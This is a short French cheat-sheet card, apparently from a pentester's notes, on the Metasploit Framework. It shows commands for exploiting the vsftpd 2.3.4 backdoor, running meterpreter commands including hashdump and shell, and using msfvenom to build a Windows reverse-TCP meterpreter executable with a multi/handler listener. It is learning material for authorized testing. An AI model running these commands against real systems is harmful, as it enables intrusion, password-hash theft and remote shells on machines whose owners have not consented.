---
titre: "Metasploit Framework"
tags: [Outils, exploitation, framework, meterpreter]
source: https://github.com/rapid7/metasploit-framework
---

# Metasploit Framework (msf)

**Le framework d'exploitation** de référence : base d'exploits, payloads, modules
auxiliaires (scan/brute) et post-exploitation, plus **Meterpreter** (agent
avancé). C'est le moteur derrière [[MetasploitMCP]].

> ⚠️ Exploitation sur cible autorisée uniquement. Cf. `README`.

## Installation
```bash
sudo apt install metasploit-framework     # Kali : déjà présent
msfconsole -q                              # lancer la console
```

## Flux type
```text
msf6 > search type:exploit vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > info                       # description, options, cibles
msf6 > set RHOSTS 10.10.10.10
msf6 > set LHOST tun0
msf6 > check                      # tester sans exploiter (si supporté)
msf6 > run                        # ou 'exploit'
meterpreter > getuid ; sysinfo ; hashdump ; shell
```

## Outils compagnons
```bash
# générer un payload autonome
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o s.exe
# recevoir le shell (multi/handler)
msf6 > use exploit/multi/handler; set payload ...; run
```

## Réflexe
`search` + `info` + `set` + `check` avant `run`. Modules `auxiliary/scanner/*` pour
énumérer. Toujours régler `LHOST` sur l'IP VPN (`tun0`). Un exploit trouvé via
[[searchsploit]] a souvent un équivalent msf.
